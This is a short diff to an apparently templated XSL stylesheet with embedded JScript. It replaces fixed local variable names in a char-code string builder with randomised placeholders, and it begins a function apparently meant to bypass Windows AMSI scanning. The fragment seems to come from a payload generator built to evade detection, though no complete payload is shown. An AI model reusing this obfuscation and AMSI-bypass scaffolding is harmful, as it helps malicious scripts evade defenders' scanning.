@@ -5,7 +5,7 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-function {{ v.fn_build_str }}(a){var s="";for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]);return s;}
+function {{ v.fn_build_str }}(a){var {{ v.jsc_lv_bs }}="";for(var {{ v.jsc_lv_bi }}=0;{{ v.jsc_lv_bi }}<a.length;{{ v.jsc_lv_bi }}++){{ v.jsc_lv_bs }}+=String.fromCharCode(a[{{ v.jsc_lv_bi }}]);return {{ v.jsc_lv_bs }};}
 
 function {{ v.fn_amsi }}() {
     try {
